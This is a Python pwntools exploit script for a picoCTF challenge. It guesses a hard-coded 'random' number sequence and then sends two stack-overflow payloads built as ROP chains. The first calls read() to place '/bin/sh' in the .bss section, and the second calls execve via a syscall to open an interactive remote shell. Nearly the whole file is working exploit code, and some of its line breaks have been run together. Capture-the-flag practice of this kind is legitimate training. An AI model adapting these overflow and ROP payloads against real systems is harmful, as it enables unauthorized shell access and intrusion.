#!/bin/python3from pwn import *HOST = 'jupiter.challenges.picoctf.org'
PORT = <port>
EXE  = './vuln'r = remote(HOST, PORT)elf = ELF(EXE)main    = 0x400c8c
pop_rax = 0x4163f4
pop_rdi = 0x400696
pop_rsi = 0x410ca3
pop_rdx = 0x44a6b5
syscall = 0x40137c
bss     = 0x6bc4a0
read    = elf.symbols['read']random_sequence = [84, 87, 78, 16, 94]r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(random_sequence[0]).encode())
r.recvuntil(b'Name? ')payload  = b'\x90'*120
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(9)
payload += p64(read)
payload += p64(main)r.sendline(payload)input('The program has been exploited. Press ENTER to get a remote shell...')r.sendline(b'/bin/sh\x00')r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(random_sequence[1]).encode())
r.recvuntil(b'Name? ')payload  = b'\x90'*120
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)r.sendline(payload)r.interactive()